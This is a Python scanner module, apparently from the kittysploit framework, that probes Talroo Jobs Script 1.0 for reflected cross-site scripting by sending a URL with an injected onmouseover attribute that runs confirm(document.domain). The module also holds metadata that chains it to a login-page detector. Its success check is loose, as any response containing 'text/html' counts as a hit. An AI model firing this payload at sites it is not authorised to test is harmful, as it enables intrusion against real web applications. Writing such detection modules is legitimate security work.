#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Talroo Jobs Script 1.0 - Cross-Site Scripting Detection',
        'description': "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'xss', 'unauth', 'talroo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/173043/Talroo-Jobs-Script-1.0-Cross-Site-Scripting.html',
            'https://www.exploitalert.com/view-details.html?id=39619',
            'https://www.netartmedia.net/talroo-jobs',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?page=jobs&category=1&lrw3e%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22k1n44=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Talroo Jobs', 'confirm(document.domain)', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Talroo Jobs Script 1.0 - Cross-Site Scripting detected",
                path='/index.php?page=jobs&category=1&lrw3e%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22k1n44=1',
            )
            return True
        return False

